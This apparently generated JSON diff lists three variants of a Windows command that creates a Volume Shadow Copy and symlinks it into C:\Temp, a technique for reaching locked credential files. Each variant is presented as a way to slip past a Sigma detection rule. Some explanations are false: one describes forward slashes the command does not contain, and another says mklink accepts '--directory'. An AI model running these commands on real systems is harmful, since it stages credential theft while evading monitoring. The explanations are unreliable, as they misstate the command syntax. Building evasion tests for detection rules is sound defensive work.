@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c vssadmin create shadow /for=C: & mklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
+    "explanation": "The original command is modified by omitting the quotes around 'cmd.exe' and using forward slashes for path normalization where acceptable. The command structure and intent remain unchanged, making it a valid test for bypassing the Sigma rule."
+  },
+  {
+    "output": "cmd /c vssadmin.exe create shadow /for=C: && mklink /D C:\\Temp\\vssstore \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
+    "explanation": "The command is altered by replacing '&' with '&&' for logical AND, and adding quotes around the UNC path. These changes are syntactically valid and do not alter the behavior, making it suitable for testing bypass techniques."
+  },
+  {
+    "output": "cmd.exe /c vssadmin create shadow /for=C: & mklink --directory C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
+    "explanation": "The long form of the mklink option '/D' is replaced with '--directory', which is an equivalent syntax. This substitution is valid and maintains the original command's intent."
+  }
+]
